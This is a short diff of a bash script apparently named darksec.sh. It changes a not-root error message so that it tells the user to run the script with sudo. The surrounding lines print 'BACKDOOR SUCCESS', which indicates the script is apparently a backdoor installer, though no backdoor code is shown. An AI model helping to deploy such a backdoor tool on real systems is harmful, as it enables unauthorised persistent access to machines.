@@ -31,5 +31,5 @@ if [ $(/usr/bin/whoami) == "root" ]; then
 	echo "[+] COMPLETED HAPPY HACKING, BACKDOOR SUCCESS!"
 
 else
-	echo "You not root, run with root"
+	echo "You not root, run with root --> sudo bash darksec.sh"
 fi
